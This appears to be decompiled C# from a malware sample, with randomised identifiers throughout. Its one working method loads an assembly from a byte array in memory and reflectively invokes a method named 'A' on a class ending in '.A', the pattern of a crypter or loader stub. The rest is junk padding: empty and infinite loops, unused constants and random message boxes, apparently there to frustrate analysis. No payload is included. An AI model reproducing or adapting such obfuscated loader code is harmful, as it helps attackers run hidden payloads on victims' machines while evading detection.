using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Avgnte;

[StandardModule]
internal sealed class eLIeLJcxXmXw2c9t2Q
{
	public static void i95B522HV2w4e4g75IeW8XPJr()
	{
		while (true)
		{
		}
	}

	public static object Rm(byte[] AssemblyName, object[] args)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
	}

	private static object f5puzR81A0229vaURZd8EesDX9RL()
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		int num = 4;
		do
		{
			new decimal(9L);
			new decimal(25906098L);
			new decimal(25954133L);
			num = checked(num + 1);
		}
		while (num <= 236);
		Interaction.MsgBox((object)"SNrXt981w71Rp7U9r5h", (MsgBoxStyle)0, (object)null);
		return 22;
	}

	public static void w4XD4BD()
	{
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			while (true)
			{
				for (int i = 10; i <= 2; i++)
				{
					new decimal(4258493L);
					for (int j = 891; j <= 822; j++)
					{
					}
				}
				try
				{
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					new decimal(4L);
					new decimal(2L);
					ProjectData.ClearProjectError();
				}
				try
				{
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				MessageBox.Show("h3T|L(?&^v’P7@EiT\u008f_`e3#/;qd8Aˆ‹KQFm^D`)1C01h\u007fmZp>BFa>#\u007fT0D`nW&xi~f’ƒfzD††N=UOBa6‡\u008d’aI-NY8M’");
			}
		}
	}
}
